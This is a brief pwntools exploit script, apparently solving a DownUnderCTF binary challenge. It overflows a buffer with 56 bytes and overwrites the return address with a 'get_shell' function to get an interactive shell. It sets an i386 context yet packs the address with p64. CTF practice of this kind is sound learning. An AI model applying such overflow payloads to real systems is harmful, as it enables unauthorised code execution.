from pwn import *

context.update(arch='i386', os='linux')
context.terminal = ['iterm2', 'new-window']

HOST, PORT = 'chal.duc.tf', 30002
BINARY = './run'
#LIBC = './libc'

elf  = ELF(BINARY)
#libc = ELF(LIBC)

if args.REMOTE:
	p = remote(HOST, PORT)
else:
	p = process(BINARY)


payload = 'a'*56
payload += p64(elf.symbols['get_shell'])
p.recv()
p.sendline(payload)
p.interactive()

	

